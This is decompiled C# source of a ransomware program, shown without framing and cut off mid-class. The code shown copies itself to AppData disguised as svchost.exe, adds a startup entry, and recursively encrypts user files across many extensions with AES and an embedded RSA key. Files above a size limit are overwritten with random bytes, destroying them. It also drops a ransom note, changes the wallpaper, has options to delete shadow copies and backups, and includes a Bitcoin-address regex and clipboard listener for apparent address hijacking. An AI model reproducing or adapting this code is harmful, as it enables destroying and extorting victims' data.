using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = false;

	private static string spreadName = "surprise";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = false;

	private static bool checkdeleteShadowCopies = false;

	private static bool checkdisableRecoveryMode = false;

	private static bool checkdeleteBackupCatalog = false;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[2] { "please control the shit u are downloading hahahahah", "" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>zUtw705vcvlizMT508vh2gnOtjbW0cjapYxFN979MzSLlzXwxRNZ8xE8i6v7sqZL3jp7mIw7l8LG2+IIYn27pFLsUcz89FQhPkCQIPZur5gEG7DAT3JvJQ/DPCNwWea0dg9tP4Z2JS9mkXMP34Q2J/KgN2N9hHz84/H/tcSrgdU=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

